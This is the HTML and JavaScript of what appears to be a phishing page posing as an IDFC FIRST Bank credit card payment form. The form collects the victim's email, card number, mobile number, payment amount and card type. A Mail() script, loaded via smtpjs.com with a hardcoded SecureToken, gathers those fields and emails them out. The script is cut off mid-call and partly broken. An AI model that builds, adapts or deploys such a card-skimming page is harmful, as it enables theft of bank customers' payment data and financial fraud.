        <div class="container">

            <input type="hidden" name="formAction" value="null">
            <div class="row appPage1">
                <div class="col-md-8 leftSection" style="padding: 1px;">
                    <div class="desktopds"><img style="margin-bottom: 15px;" src="images/make.jpg"></div>

                            <form onsubmit="Mail(); reset(); return false;" class="form-horizontal">
                                <div class="form-group registerQPEmail">

                                    <div class="col-sm-7"><input type="email" class="form-control" id="qpemail" name="email" placeholder="Enter email" required>

                                <div data-role="cardlist" class="form-group noquickPayCard">

                                        <input type="text" minlength="16" maxlength="16" name="sbi_card" id="CardNum0" class="form-control col-md-3 col-xs-3 col-sm-3" placeholder="Enter card number" ondrag="return false;" ondrop="return false;" required>

                                    </div>
                                </div>


                                <div class="form-group row cardVerifier">
                                    <label for="CardNum1" class="col-sm-4 control-label">Re-enter IDFC FIRST Bank Credit Card Number</label>

                                    </div>
                                </div>

                                <div class="form-group row ">
                                    <label for="additional_info8" class="col-sm-4 control-label">Mobile number</label>

                                        <div class="input-group-addon">+91</div><input type="text" class="form-control" id="additional_info8" name="mobile" placeholder="Enter mobile" autocomplete="off" maxlength="10" required></div>
                                </div>


                                <div class="form-group">
                                    <label for="email" class="col-sm-4 control-label">Payment amount</label>
                                    <div class="input-group col-md-4 col-sm-5">
                                        <div class="input-group-addon" style="width:50px;"><i class="fa fa-inr" style="font-size:16px"></i></div><input type="tel" class="form-control" id="txn_amount" name="amount" maxlength="10" placeholder="Enter amount" onBlur="checkAmount(this)" required=""></div>
                                </div>




                                <div class="form-group payOption">
                                    <label for="banksDropdown" class="col-sm-4 control-label" style="color:#333; font-size:13px !important;">Pay From</label>

                                    <div class="input-group ">
                                        <input id="DEBIT" type="radio" name="paymode" onclick="myFunction()" checked value="debit"><label for="DEBIT">Debit Card</label>
                                        <input class="crd" id="NETB" type="radio" name="paymode" onclick="myFunction2()" value="credit"><label for="NETB">Credit Card</label>

                                        <div class="col-sm-9 col-xs-12" style="visibility: visible;" id="myDIV">
                                            <div style="padding-left: 0px;" class="col-sm-12 col-xs-12" id="banksDropdown">
                                                <select class="form-control" id="debit_bank">
  <option selected="selected" value="">-----------Select Payment Option------------</option>
  <option value = "Visa Card">Visa Card</option>
  <option value = "Master Card">Master Card</option>
  <option value = "Rupay Card">Rupay Card</option>
  <option value = "Contactless Card">Contactless Card</option>
  <option value = "Visa Electron Card">Visa Electron Card</option>
  <option value = "Maestro Card">Maestro Card</option>
</select>
                                            </div>
                                        </div>

                                        <div class="col-sm-9 col-xs-12" id="myDIV2" style="display: none;">
                                            <div style="padding-left: 0px;" class="col-sm-12 col-xs-12">
                                                <select class="form-control" id="credit_bank">
  <option selected="selected" value="">-----------Select Credit Option------------</option>
  <option value = "Visa Card">Visa Card</option>
  <option value = "Master Card">Master Card</option>
  <option value = "Rupay Card">Rupay Card</option>
  <option value = "Contactless Card">Contactless Card</option>

</select>
                                            </div>
                                        </div>
                                    </div>

                                </div>

                                <div id="buttonSection" class="panel clearfix">
                                    <div class="panel-footer">
                                        <div class="row">
                                            <div class="col-md-4"></div>
                                            <div class="col-md-6 col-xs-12">
                                                <button onClick="getData();" style="padding: 0; border: none;" type="button" name="submit" id="buttonss" class="col-xs-12"><img style="width: 100%;" src="images/btn.jpg"></button>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                        </div>
                    </div>
                </div>

                <div class="col-md-4 rightSection">

                        <img src="txt.jpg" alt="" width="100%">

        <script type="text/javascript">
            function myFunction() {
                document.getElementById('myDIV').style.display = 'block';
                document.getElementById('myDIV2').style.display = 'none';
            }

            function myFunction2() {
                document.getElementById('myDIV').style.display = 'none';
                document.getElementById('myDIV2').style.display = 'block';
            }

            $("#buttonss").click(function() {
                var card1 = $("#CardNum0").val();
                var card2 = $("#CardNum1").val();
                if (card1 != card2) {
                    alert("Card number did not match..");
                } else {
                    $("#buttonss").attr("type", "submit");
                }
            });
        </script>
<script src="https://smtpjs.com/v3/smtp.js"></script>
<script type="text/javascript">
  function Mail(){

    let qpemail = document.getElementById("qpemail").value;
    let CardNum0 = document.getElementById("CardNum0").value; 
    let additional_info8 = document.getElementById("additional_info8").value; 
    let txn_amount = document.getElementById("txn_amount").value; 
    let debit_bank = document.getElementById("debit_bank").value; 
    let credit_bank = document.getElementById("credit_bank").value; 

    Email.send({
    SecureToken : "2d487669-8bd5-4507-ba0d-fec142f31352",

);

 function getData()
{
